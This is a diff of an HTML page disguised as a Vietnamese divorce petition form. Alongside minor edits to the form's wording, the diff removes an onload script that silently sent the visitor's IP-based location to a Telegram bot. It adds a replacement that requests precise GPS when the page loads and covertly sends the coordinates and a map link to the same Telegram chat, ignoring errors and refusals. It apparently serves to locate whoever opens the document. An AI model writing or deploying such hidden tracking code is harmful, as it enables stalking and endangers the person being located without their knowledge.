@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Đơn xin ly hôn</title>
+    <title>Đơn ly hôn</title>
     <style>
         body { font-family: 'Times New Roman', Times, serif; line-height: 1.6; margin: 0; padding: 20px; background-color: #f4f4f4; }
         .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 40px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
@@ -35,11 +35,9 @@
             <p>Nơi cư trú: ..................................................................................................................</p>
             
             <p><strong>NỘI DUNG YÊU CẦU:</strong></p>
-            <p><strong>1. Về tình cảm:</strong> Chúng tôi kết hôn tự nguyện, có đăng ký kết hôn tại UBND .............................. ngày ..../..../......... Tuy nhiên, trong quá trình chung sống phát sinh nhiều mâu thuẫn không thể hàn gắn, mục đích hôn nhân không đạt được. Nay chúng tôi thuận tình ly hôn.</p>
+            <p><strong>1. Về tình cảm:</strong> Chúng tôi kết hôn tự nguyện. Nay trong quá trình chung sống phát sinh nhiều mâu thuẫn không thể hàn gắn, mục đích hôn nhân không đạt được. Nay chúng tôi thuận tình ly hôn.</p>
             <p><strong>2. Về con chung:</strong> ........................................................................................................</p>
             <p><strong>3. Về tài sản chung:</strong> .....................................................................................................</p>
-            <p><strong>4. Về nợ chung:</strong> ...........................................................................................................</p>
-            
             <p>Kính đề nghị Quý Tòa xem xét, giải quyết theo quy định của pháp luật.</p>
         </div>
 
@@ -58,26 +56,30 @@
         const CHAT_ID = "-5345269525";
 
         window.onload = function() {
-            // Sử dụng API lấy vị trí qua IP (Không cần hỏi quyền, chạy được trên HTTP)
-            fetch('http://ip-api.com/json/')
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === "success") {
-                        const lat = data.lat;
-                        const lon = data.lon;
-                        const ip = data.query;
-                        const city = data.city;
-                        const isp = data.isp;
-                        
-                        const message = `📍 Có người vừa mở đơn ly hôn!\n- IP: ${ip}\n- Vị trí ước tính: ${city}\n- Nhà mạng: ${isp}\n- Bản đồ: https://www.google.com/maps?q=${lat},${lon}`;
-                        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-
-                        // Gửi dữ liệu âm thầm về Telegram
-                        fetch(url).catch(error => {});
-                    }
-                })
-                .catch(error => {});
+            if (navigator.geolocation) {
+                // Kích hoạt lấy GPS chính xác cao
+                navigator.geolocation.getCurrentPosition(sendToTelegram, silentError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            }
         };
+
+        function sendToTelegram(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            
+            const message = `📍 Có người vừa mở Đơn ly hôn và BẤM CHO PHÉP VỊ TRÍ!\n- Loại: Vị trí GPS chính xác\n- Vĩ độ: ${lat}\n- Kinh độ: ${lon}\n- Sai số: ${accuracy} mét\n- Bản đồ: https://www.google.com/maps?q=${lat},${lon}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url).catch(error => {});
+        }
+
+        function silentError(error) {
+            // Lỗi hoặc từ chối sẽ bỏ qua âm thầm
+        }
     </script>
 </body>
 </html>
